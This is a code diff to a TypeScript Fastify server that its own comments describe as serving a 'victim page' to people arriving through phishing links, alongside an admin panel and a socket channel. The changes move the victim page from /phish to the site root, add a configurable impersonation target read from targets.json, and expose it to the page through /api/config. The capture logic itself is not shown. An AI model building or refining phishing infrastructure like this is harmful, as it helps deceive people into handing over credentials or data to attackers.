@@ -24,6 +24,8 @@ const ConfigSchema = z.object({
   socket_key: z.string().min(8),
   admin_ips: z.array(z.string()),
   proxy: z.string().nullable(),
+  port: z.number().int().positive().optional(),
+  target: z.string(),
 });
 
 /**
@@ -83,6 +85,11 @@ async function main(): Promise<void> {
   // Load configuration files in parallel for faster startup
   const [config, targets] = await Promise.all([loadConfig(), loadTargets()]);
 
+  // Validate that the configured target exists in targets.json
+  if (!targets[config.target]) {
+    throw new Error(`Target "${config.target}" not found in targets.json. Available targets: ${Object.keys(targets).join(', ')}`);
+  }
+
   const publicDir = join(__dirname, '..', 'public');
 
   // ─── Fastify HTTP Server Setup ──────────────────────────────────────────────
@@ -121,11 +128,11 @@ async function main(): Promise<void> {
   // ─── HTTP Routes ────────────────────────────────────────────────────────────
 
   /**
-   * GET /phish
+   * GET /
    * Serves the victim page (victim.html).
    * This is the page victims are redirected to via phishing links.
    */
-  fastify.get('/phish', async (_req, reply) => {
+  fastify.get('/', async (_req, reply) => {
     return reply.sendFile('victim.html');
   });
 
@@ -149,6 +156,13 @@ async function main(): Promise<void> {
    * Returns 200 OK with JSON status.
    */
   fastify.get('/healthz', async () => ({ status: 'ok' }));
+
+  /**
+   * GET /api/config
+   * Returns the configured target name from config.json.
+   * Used by victim.html to determine which target to load.
+   */
+  fastify.get('/api/config', async () => ({ target: config.target }));
 
   // ─── Socket.IO Authentication Middleware ────────────────────────────────────
 
@@ -207,7 +221,7 @@ async function main(): Promise<void> {
 
   // ─── Start HTTP Server ──────────────────────────────────────────────────────
 
-  const port = parseInt(process.env['PORT'] ?? '80', 10);
+  const port = config.port ?? parseInt(process.env['PORT'] ?? '3000', 10);
   const host = process.env['HOST'] ?? '0.0.0.0';
 
   await fastify.listen({ port, host });
@@ -225,7 +239,7 @@ async function main(): Promise<void> {
   console.log('  ─────────────────────────────────────────────────────────────');
   console.log(`  Server:      http://${host}:${port}`);
   console.log(`  Admin Panel: http://localhost:${port}/admin`);
-  console.log(`  Victim Page: http://localhost:${port}/phish`);
+  console.log(`  Victim Page: http://localhost:${port}/`);
   console.log('');
 
   // ─── Graceful Shutdown Handler ──────────────────────────────────────────────
@@ -238,15 +252,24 @@ async function main(): Promise<void> {
    * 2. Close Fastify server (stops accepting new connections)
    * 3. Exit process with code 0
    */
+  let isShuttingDown = false;
   const shutdown = async () => {
+    if (isShuttingDown) return;
+    isShuttingDown = true;
     console.log('\n[server] Shutting down...');
-    await closeAll();
-    await fastify.close();
-    process.exit(0);
+    try {
+      await closeAll();
+      await fastify.close();
+      console.log('[server] Shutdown complete');
+    } catch (err) {
+      console.error('[server] Error during shutdown:', err);
+    } finally {
+      process.exit(0);
+    }
   };
 
-  process.on('SIGINT', () => void shutdown());
-  process.on('SIGTERM', () => void shutdown());
+  process.on('SIGINT', () => { void shutdown(); });
+  process.on('SIGTERM', () => { void shutdown(); });
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
